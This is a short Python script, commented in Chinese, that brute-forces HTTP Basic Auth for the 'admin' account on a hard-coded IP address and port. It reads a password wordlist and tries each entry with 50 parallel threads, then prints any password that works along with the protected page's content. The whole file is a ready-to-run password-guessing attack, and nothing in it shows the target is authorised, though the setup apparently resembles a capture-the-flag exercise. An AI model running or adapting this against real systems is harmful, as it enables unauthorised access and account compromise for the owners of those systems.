#!/usr/bin/env python3
"""
快速HTTP Basic Auth爆破 - 仅测试admin用户
"""

import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures

target_url = "http://47.113.178.182:32823/"

# 读取密码字典
with open('password (1).txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

username = 'admin'

print(f"[*] 测试用户名: {username}")
print(f"[*] 密码数量: {len(passwords)}")
print(f"[*] 开始爆破...\n")

def try_password(password):
    try:
        response = requests.get(
            target_url,
            auth=HTTPBasicAuth(username, password),
            timeout=3
        )

        if response.status_code == 200:
            return (password, response.text)
        return None
    except:
        return None

# 使用线程池
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_password, pwd): pwd for pwd in passwords}

    for i, future in enumerate(concurrent.futures.as_completed(futures)):
        if (i + 1) % 20 == 0:
            print(f"[*] 已测试: {i+1}/{len(passwords)}")

        result = future.result()
        if result:
            password, content = result
            print(f"\n{'='*70}")
            print(f"[+] 成功!")
            print(f"[+] 用户名: {username}")
            print(f"[+] 密码: {password}")
            print(f"{'='*70}")
            print(f"\n{content}")
            print(f"\n{'='*70}")
            executor.shutdown(wait=False, cancel_futures=True)
            break
